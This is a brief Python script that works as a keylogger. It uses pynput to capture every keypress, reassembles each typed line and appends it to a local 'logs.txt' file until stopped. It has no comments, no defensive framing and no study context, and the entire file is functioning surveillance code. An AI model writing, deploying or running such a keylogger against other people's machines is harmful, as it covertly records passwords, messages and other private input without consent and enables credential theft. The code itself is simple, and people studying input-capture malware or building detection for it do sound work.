from pynput import keyboard


FILENAME = 'logs.txt'

def on_press(key):
	global line

	try:
		# Alphanumeric keys
		line += key.char
	except AttributeError:
		# Special keys
		if key == keyboard.Key.space:
			line += " "
		elif key == keyboard.Key.backspace:
			line = line[:-1]
		elif key == keyboard.Key.enter:
			with open(FILENAME, 'a') as file:
				file.write(line)
				file.write('\n')
			line = ''
		else:
			pass

if __name__ == '__main__':
	try:
		line = ''
		with keyboard.Listener(on_press=on_press) as listener:
			listener.join()
	except KeyboardInterrupt:
		print('\n\nEnd of the program\n\n')
